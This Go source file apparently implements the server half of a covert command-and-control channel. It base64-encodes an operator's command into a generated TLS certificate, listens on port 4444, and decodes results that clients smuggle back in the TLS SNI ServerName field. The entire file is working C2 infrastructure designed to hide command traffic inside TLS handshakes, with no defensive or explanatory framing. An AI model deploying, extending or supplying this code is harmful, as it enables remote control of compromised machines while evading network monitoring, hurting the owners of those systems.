package main

import (
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"log"

	"github.com/lesnuages/yuna/network"
)

var (
	port    = flag.String("port", "4444", "Port to listen on")
	command = flag.String("command", "", "Command to execute")
)

func handleConn(conn *tls.Conn) {
	connState := conn.ConnectionState()
	data := connState.ServerName
	if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
		fmt.Println(string(decoded[:]))
	}
}

func main() {
	flag.Parse()
	log.Println("Command:", *command)
	var (
		commands []string
		cert     tls.Certificate
		err      error
	)
	commands = append(commands, *command)
	for i, val := range commands {
		commands[i] = base64.StdEncoding.EncodeToString([]byte(val))
	}
	cert, err = network.GenerateCertificate("server", commands)
	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	ln, err := tls.Listen("tcp", ":"+(*port), config)
	if err != nil {
		log.Fatalf("Could not start listener: %s\n", err)
	}
	defer ln.Close()
	log.Println("Listenning on 0.0.0.0:" + (*port))
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		conn.Write([]byte("hi\n"))
		go handleConn(conn.(*tls.Conn))
	}
}
